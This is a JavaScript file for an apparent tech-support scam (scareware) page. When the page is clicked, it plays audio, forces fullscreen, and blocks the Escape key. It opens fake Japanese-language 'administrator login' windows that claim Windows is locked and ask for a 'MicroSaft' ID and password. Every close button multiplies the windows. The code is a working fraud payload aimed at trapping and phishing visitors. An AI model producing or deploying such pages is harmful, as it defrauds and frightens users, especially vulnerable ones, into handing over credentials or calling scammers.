document.addEventListener("DOMContentLoaded", function() {
    let loop_open_window_flg = false;
    let click_bg = document.getElementById('container');
    click_bg.addEventListener("click", function(event) {
        var audio = document.getElementById("myAudio");
        audio.play();
        openFullscreen();
    });
});


// open new window
// 新しいウィンドウを作成する関数
function createWindow() {
    loop_open_window_flg = true;
    var newWindow = document.createElement("div");
    newWindow.classList.add("window-modal");
    newWindow.classList.add("window-center");

    var header = document.createElement("div");
    header.classList.add("window-header");
    var title = document.createElement("h3");
    header.appendChild(title);
  
    var closeButton = document.createElement("button");
    closeButton.classList.add("window_btn");
    closeButton.textContent = "x";
    closeButton.onclick = function() {
        createWindow()
    };
    header.appendChild(closeButton);
  
    newWindow.appendChild(header);

    var body = document.createElement("h2");
    body.classList.add("fnt_white");
    body.classList.add("window-body");
    body.textContent = "管理者ログイン";
    newWindow.appendChild(body);
  
    var body = document.createElement("h3");
    body.classList.add("fnt_white");
    body.classList.add("window-body");
    body.textContent = "異常なアクティビティによりWindowsがロックされました。\nMicroSaft IDとパスワードを使用してください。\nサポートが必要な場合はサポートセンターに連絡ください。";
    newWindow.appendChild(body);

    var body = document.createElement("button");
    body.classList.add("modal_dummy_btn");
    body.textContent = "ウィンドウを閉じる";
    body.onclick = function() {
        createWindow()
        createWindow()
    };
    newWindow.appendChild(body);

    var randomX = Math.floor(Math.random() * (window.innerWidth - 300));
    var randomY = Math.floor(Math.random() * (window.innerHeight - 200));
    newWindow.style.left = randomX + "px";
    newWindow.style.top = randomY + "px";
  
    document.body.appendChild(newWindow);
  }

  function openFullscreen() {
    var elem = document.documentElement;
    if (elem.requestFullscreen) {
      elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) { /* Safari */
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE11 */
      elem.msRequestFullscreen();
    }
  }

//   ESC...oh I am. I am...
  function disableEscKey(event) {
    if (event.keyCode === 27) {
      event.preventDefault();
      event.stopPropagation();
    }
  }
  document.addEventListener("keydown", disableEscKey);
  